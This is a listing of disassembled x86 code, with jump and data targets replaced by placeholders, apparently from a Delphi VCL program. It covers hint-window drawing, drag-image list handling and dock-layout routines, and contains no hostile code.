add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442162
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442169
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ReleaseDC
retn
sub_442170
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_442209
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41ce24
mov eax ebx
call sub_43c890
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x14 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x208 ]
call sub_41dd60
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442210
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
sub_442218
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_442284
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_44230f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442316
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43a570
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41dbc0
mov edx eax
add edx 0x6
mov eax esi
call sub_439d2c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43a570
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41dbdc
mov edx eax
add edx 0x4
mov eax esi
call sub_439d50
sub_44231c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4424f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a5a0
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43b7c8
mov eax [ esi ]
call sub_457f48
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_457f54
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_457f48
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_457f3c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_457f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_457f30
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_457f3c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_457f30
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43e48c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424fc
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4041a8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4455b4
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call [ rw-data ]
sub_442504
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44252c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412be0
mov eax esi
call sub_43c890
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ esi + 0x208 ]
call sub_41dd60
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_442588
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412be0
call sub_42f57c
call sub_42f65c
test al al
jne r-xdata
call sub_42f57c
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42fa1c
push esp
push 0x1
push 0xf
push 0x0
call sub_42f57c
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42f71c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4425f4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43ed94
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_442618
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_442670
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442730
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458464
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42460c
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458464
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42460c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_44273c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_447890
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44279c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448504
mov eax ebx
call sub_4476bc
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4427c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_4476bc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_442670
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_442828
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_44273c
push 0x0
call ShowCursor
sub_442828
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_4476bc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_44288c
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_442618
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44288c
push ebx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4428b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_442618
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_442924
push ebx
push esi
mov esi eax
mov eax esi
call sub_4476bc
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_44288c
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_442784
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_44296c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43ca84
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43914c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4429c8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43cba8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_442a18
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41da6c
xor eax eax
push ebp
push sub_442ab6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41dde0
xor eax eax
push ebp
push sub_442a93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_439164
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a9a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41dde0
retn
sub_442ac8
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_442b5c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_442ae4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_442b5c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_443154
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_442b5c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_442b90
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_442c20
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov edx 0x2
call sub_442c20
jmp r-xdata
retn
sub_442bd8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_442c8c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov edx 0x2
call sub_442c8c
jmp r-xdata
retn
sub_442c20
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_443054
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_442c8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_442b40
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_443054
push eax
mov eax esi
call sub_442b90
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_443054
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_442d3c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_442b40
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_443154
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_442c8c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_442b40
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_442c8c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_442b90
mov edx eax
add edx esi
mov eax ebx
call sub_44307c
mov edx edi
mov eax ebx
call sub_44307c
jmp r-xdata
mov eax ebx
call sub_442edc
mov eax ebx
call sub_44312c
mov ebx eax
test ebx ebx
jne r-xdata
sub_442de4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403ee8
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f3c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
sub_442e28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403394
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_442e99
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43b270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_442eac
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44312c
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_442edc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_442c8c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_442c8c
mov esi eax
push ebp
call sub_442eac
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44312c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_442c20
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_442c20
mov ecx ebx
pop edx
call sub_412c08
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439f30
mov eax [ ebp - 0x4 ]
call sub_443054
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_443054
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_443054
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_443054
push ebx
mov ebx eax
mov eax ebx
call sub_442b5c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_442ae4
test al al
je r-xdata
mov eax ebx
call sub_442b90
pop ebx
retn
sub_443090
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44307c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_442b2c
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_443080
mov edx esi
call sub_443090
sub_4430cc
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443054
mov edi eax
mov eax ebx
call sub_442b90
cmp edi eax
jl r-xdata
mov eax esi
call sub_442d3c
mov eax [ esi + 0x1c ]
push eax
push sub_444bdc
mov edx esi
call sub_443408
mov eax ebx
call sub_443054
mov edi eax
mov eax esi
call sub_442bd8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_4430cc
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_443138
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_442b5c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_443160
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403168
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4034bc
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_442b08
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d468
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4240cc
mov edx eax
mov eax ebx
call sub_41d5ec
mov eax [ ebp - 0x4 ]
call sub_443330
xor eax eax
push ebp
push sub_44326c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43da88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_442d3c
xor eax eax
pop edx
pop ecx
pop ecx
